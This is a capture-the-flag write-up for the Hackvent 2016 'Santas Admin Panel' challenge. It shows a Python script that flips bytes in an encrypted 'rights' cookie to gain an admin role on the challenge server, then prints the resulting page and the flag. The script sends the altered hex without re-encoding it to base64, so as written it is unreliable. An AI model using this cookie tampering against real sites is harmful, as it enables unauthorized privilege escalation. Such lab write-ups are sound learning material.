---
layout: writeup
title: 'Dec 15: SAP - Santas Admin Panel'
level:
difficulty:
points:
categories: []
tags: []
flag:  HV16-R41n-d33r-8yt3-Fl1p-H4ck

---

## Challenge

*you better know how to flip around*

You got access to Santa's hompage. But without admin rights there's
nothing to see here...

A valid login is: raindeer10 / s4nt4

[Admin Panel][1]

## Solution

We log in to the site with the provided credentials, navigate to the
admin panel and see this:

    <!DOCTYPE html>
    <html>
    <head>
        <title>Hackvent 2016</title>
        <link rel="stylesheet" type="text/css" href="./css/main.css">
    </head>
    <body>
        <div class="background-container"></div>
        <ul class="navbar">
            <div class="user-info">
                <a>Logged in as: raindeer10</a>
                <img src="./img/santa_profile.png">
                <a>User Role: Standard</a>
            </div>
            <li><a href="main.php">Home</a></li>
            <li><a href="admin.php">Adminpanel</a></li>
            <li><a href="main.php?action=logout">Logout</a></li>
        </ul>
        <div class="home">
            <div class="flag_container">
                <p>Only for admins and h4x0rs!</p>
                <p>Flag not shown!</p>
            </diV>
        </div>
    </body>
    </html>
{: .language-html}

So our role is `Standard` and we get a message that the flag is not
shown, so presumably we need to change our role

we notice a cookie:

    Cookie: cmlnaHRz=5WT4yVGAfS%2Fn0z5MzSbbZd0K3vpWLmhfxuFo85apE%2Bo%3D; PHPSESSID=kj2snoalv4a0d5v3du0oa1rvv4

and `cmlnaHRz` is base64 for `rights` so presumably we have to edit that
cookie somehow to change our role.

If we do this randomly, we get `Role=None` so need to be smart about
it... hint suggests *flipping around*
but what? ..bits? bytes?

To see which bytes give a different role when changed, we increase each
of them in turn and see what we get:

    import requests
    import base64
    import urllib
    import binascii

    url="http://challenges.hackvent.hacking-lab.com/4dm1nP4n3l/admin.php"

    rights="5WT4yVGAfS/n0z5MzSbbZd0K3vpWLmhfxuFo85apE+o="

    cookie=dict(PHPSESSID="0aim1o2udt333jht40ls9c9mj4",cmlnaHRz=urllib.quote_plus(rights))
    hexcookie = binascii.hexlify(base64.b64decode(rights))

    new=''
    for i in range(0,len(hexcookie),2):
        new += hex(int(hexcookie[i:i+2],16)+1)[2:].zfill(2)

    for i in range (0,64):
        newrights = hexcookie[0:i]+new[i:i+2]+hexcookie[i+2:]

        cookie=dict(PHPSESSID="0aim1o2udt333jht40ls9c9mj4",cmlnaHRz=urllib.quote_plus(newrights))

        r=requests.get(url,cookies=cookie)

        for line in r.text.split('\n'):
            if "Role" in line and "Admin" in line:
                print r.text
{: .language-python}

Huh! this already got us an admin role in a few of the cases, neat!

    <!DOCTYPE html>
    <html>
    <head>
        <title>Hackvent 2016</title>
        <link rel="stylesheet" type="text/css" href="./css/main.css">
    </head>
    <body>
        <div class="background-container"></div>
            <ul class="navbar">
                <div class="user-info">
                    <a>Logged in as: raindeer10</a>
                    <img src="./img/santa_profile.png">
                    <a>User Role: Admin</a>
                </div>
                <li><a href="main.php">Home</a></li>
                <li><a href="admin.php">Adminpanel</a></li>
                <li><a href="main.php?action=logout">Logout</a></li>
            </ul>
            <div class="home">
                <div class="flag_container">
                    <p>Congratulations! You are a 1337 h4x0r!</p>
                    <p>Please get the flag!</p>
                    <img src="./img/a1be12d908971ecbebfeb1d5d2874464.png">
                </div>
            </div>
    </body>
    </html>

so we are given the location of our flag,
`./img/a1be12d908971ecbebfeb1d5d2874464.png`

![](writeupfiles/dec15_ball.png)





[1]: http://challenges.hackvent.hacking-lab.com/4dm1nP4n3l/index.php
